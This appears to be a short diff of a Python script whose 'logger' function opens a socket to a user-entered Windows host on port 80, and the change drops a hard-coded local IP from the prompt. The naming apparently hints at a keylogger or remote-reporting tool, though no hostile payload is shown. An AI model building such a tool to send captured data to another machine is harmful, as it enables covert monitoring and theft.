@@ -9,7 +9,7 @@ from urllib import request as urlrequests
 
 def logger():
     s = socket.socket()
-    windows_ip = input("Enter address: 192.168.86.89")
+    windows_ip = input("Enter address: ")
     try:
         host = windows_ip
         port = 80
